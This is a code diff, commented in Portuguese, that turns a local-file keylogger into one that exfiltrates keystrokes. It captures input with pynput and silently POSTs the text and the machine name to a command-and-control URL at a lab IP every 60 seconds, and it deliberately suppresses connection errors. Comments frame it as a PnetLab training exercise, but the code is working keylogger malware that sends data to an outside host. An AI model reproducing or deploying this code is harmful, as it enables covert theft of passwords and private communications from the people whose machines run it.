@@ -1,50 +1,58 @@
+import requests
 from pynput import keyboard
+from threading import Timer
+import os
 
-# Ajustado o nome da variável e teclas
-IGNORE_KEYS = {
-    keyboard.Key.shift, keyboard.Key.shift_r, 
-    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
-    keyboard.Key.alt_l, keyboard.Key.alt_r, 
-    keyboard.Key.cmd, keyboard.Key.caps_lock
-}
+# CONFIGURAÇÕES DO C2
+# Substitua pelo IP do seu servidor no PnetLab/Laboratório
+C2_URL = "http://192.168.100.196:80/api/logs"
+INTERVALO_ENVIO = 60 # segundos
 
-log_buffer = ""
-BUFFER_LIMIT = 10  # Grava no arquivo a cada 10 teclas
+log = ""
 
-def write_to_file(data):
-    with open("log.txt", "a", encoding="utf-8") as f:
-        f.write(data)
+def enviar_para_c2():
+    global log
+    if log:
+        try:
+            # Enviamos os dados dentro de um dicionário (form-data)
+            payload = {
+                "keyboard_data": log,
+                "machine_name": os.getenv("COMPUTERNAME", "Linux_Machine") # Identifica a origem
+            }
+            
+            response = requests.post(C2_URL, json=payload, timeout=10)
+            
+            if response.status_code == 200:
+                log = "" # Limpa o log se o servidor recebeu com sucesso
+        except Exception:
+            # Em cibersegurança ofensiva, erros de conexão devem ser silenciosos
+            pass
+    
+    # Reagenda o próximo envio
+    timer = Timer(INTERVALO_ENVIO, enviar_para_c2)
+    timer.daemon = True
+    timer.start()
 
 def on_press(key):
-    global log_buffer
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.backspace:
+            log = log[:-1]
+        elif key == keyboard.Key.tab:
+            log += "\t"
+
+if __name__ == "__main__":
+    enviar_para_c2()
     
     try:
-        # Verifica se a tecla está na lista de ignoradas antes de processar
-        if key in IGNORE_KEYS:
-            return
-
-        # Captura caracteres normais
-        if hasattr(key, 'char') and key.char is not None:
-            log_buffer += key.char
-        else:
-            # Mapeamento de teclas especiais
-            special_keys = {
-                keyboard.Key.space: " ",
-                keyboard.Key.enter: "\n",
-                keyboard.Key.tab: "\t",
-                keyboard.Key.backspace: " ",
-                keyboard.Key.esc: "[ESC]"
-            }
-            log_buffer += special_keys.get(key, f"[{key}]")
-
-        # Lógica de gravação (Buffer)
-        if len(log_buffer) >= BUFFER_LIMIT or key == keyboard.Key.enter:
-            write_to_file(log_buffer)
-            log_buffer = "" # Limpa o buffer após gravar
-
-    except Exception as e:
-        print(f"Erro: {e}")
-
-# Inicia o Listener
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+    except KeyboardInterrupt:
+        # Encerramento silencioso para o laboratório
+        pass
